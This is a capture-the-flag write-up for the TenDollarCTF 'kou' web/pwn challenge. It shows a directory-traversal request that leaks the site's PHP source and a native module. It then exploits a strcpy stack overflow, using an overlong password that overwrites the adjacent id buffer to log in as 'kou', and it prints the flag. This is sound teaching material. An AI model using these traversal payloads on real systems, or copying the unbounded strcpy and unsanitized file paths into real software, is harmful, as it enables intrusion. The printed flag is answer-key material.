# TenDollarCTF 3rd - kou

## Information

Category : Web, Pwn

Solver : 7

Tag : LFI, Overflow

## Description

Author: @shpik

Eagle-Jump is black company?

Server Info: http://web2.tendollar.kr:10101/

## Exploit

It have 4 menu in this site. (੭ ᐕ)੭*⁾⁾

- Home
- Article
- Login
- Join

This site handles the page through the p parameter.

`http://web2.tendollar.kr:10101/?p=home`

p parameter is not allow wrapper and directory traversal.

There is a Secret Data in the Article menu.

If you read this, you will not get the contents with the message "You're not admin."

When you request article you can see that it is requested as f parameter.

`http://web2.tendollar.kr:10101/?p=view&f=First%20Article`

f parameter is allow directory traversal, but wrapper is not allowed.

Leak index.php.

`http://web2.tendollar.kr:10101/?p=view&f=../../var/www/html/index.php`

```html
<!-- index.php -->
<!DOCTYPE html>
<html>
<head>
	<title>Yagami Kou's Homepage</title>
	<link rel=stylesheet href="index.css">
</head>
<body>
	<?php
		@include_once('menu.php');
	?>
	<br>
	<?php
		$pageList = array(
			'home',
			'login',
			'loginchk',
			'logout',
			'view',
			'board',
			'join'
		);
		if(in_array($_GET['p'], $pageList)) {
		  @include_once($_GET['p'].'.php');
		} else {
		  @include_once('home.php');
		}		
	?>
</body>
</html>
```

Let's take a look at loginchk which seems to be important the pageList.

```html
<!-- loginchk.php -->
<?php
	$id = $_POST['id'];
	$pw = $_POST['pw'];
	if($id!='' && $pw!=''){
		if(preg_match('/kou/i',$id)){
			die('<script>alert("Don\'t login at kou.");history.back();</script>');
		}
		if(login($id,$pw)){
			$_SESSION['is_login'] = 1;
			$_SESSION['admin'] = 1;
			echo '<script>alert("Login Success.");location.href="?p=home";</script>';
		}else{
			echo '<script>alert("Login Fail.");history.back();</script>';
		}
	}else{
		echo '<script>alert("Login Fail.");history.back();</script>';
	}
?>
```

It is not allow login as "kou" in loginchk.php.

But, **login** function that verify id and password is not built-ins function.

Maybe, It is called by another modules.

```html
<!-- view.php -->
<?php
	$f = $_GET['f'];
	if(!is_array($f) && !is_null($f) && $f!=''){
//		$f = str_replace('../','', $f);
		if($f[strlen($f)-1]=='/'){
			$f[strlen($f)-1]=='\0';
		}
		if(preg_match('/Secret Data/i',$f) && $_SESSION['admin']==1){
?>
	<div class="description">
		<p style="font-size: 20px;">Secret Data</p>
		<br><br>
		<pre><?php loadFile($f); ?></pre>
	</div>
<?php
		}else if(preg_match('/Secret Data/i',$f) && $_SESSION['admin']==0){
?>
	<div class="description">
		<p style="font-size: 20px;">Secret Data</p>
		<br><br>
		<pre>You're not admin.</pre>
	</div>
<?php
		}else{
?>
	<div class="description">
		<p style="font-size: 20px;"><?=$f;?></p>
		<br><br>
		<?php
		if(preg_match('/kou\.so/i',$f)){
			echo 'Okay Here<br><div>'.file_get_contents('/var/www/modules/kou.so').'</div>';
		}
		?>
		<pre><?php loadFile($f); ?></pre>
	</div>
<?php
		}

	}else{
		echo '<script>alert("No found.");history.back();</script>';
	}
?>
```

Next, see the view.php.

It seems that f parameter is being distributed to the page through **loadFile** function.

but, It is not built-ins function, too.

If you request kou.so with f parameter, you will see that you are giving the kou.so file.

Open it !

![](./img1.png)

**loadFile** function just open file using fopen function.

Next, I see the **login** function.

![](./img2.png)

It is verfying to input value(id, pw) using loginchk function.

![](./img3.png)

**loginchk** function is compare id and pw to "kou" and "1e0c6abede7ff7184c3cefe606f9760a".

but, id can't contain "kou" because of loginchk.php.

Vulnerability is **login function**.

```c
strcpy(_id, id);
v3 = strcpy(_pw, pw);
```

It copy input value to _id and _pw using strcpy.

```c
char _pw[32]; // [rsp+20h] [rbp-68h]
char _id[33]; // [rsp+40h] [rbp-48h]
```

If you look at stacks of _id and _pw, you can see _pw followed by _id.

And copy id, then copy pw, but strcpy don't check length.

It is occur **<u>stack overflow</u>**.

If pw is inputed by "1e0c6abede7ff7184c3cefe606f9760akou", then _id is "kou" and _pw is "1e0c6abede7ff7184c3cefe606f9760a".

So, you can login as kou.

Now when you log in with id = a, pw = 1e0c6abede7ff7184c3cefe606f9760akou on the login page, you can login as kou.

After login as kou, you can read Secret Data and get Flag!

```
Secret Data

退勤する前にFLAGを残していきます。
TDCTF{Eagle_Jump_is_bl4ck_C0mpany_But_i_w4nt_to_g0_ther3}
```



**FLAG :** TDCTF{Eagle_Jump_is_bl4ck_C0mpany_But_i_w4nt_to_g0_ther3}

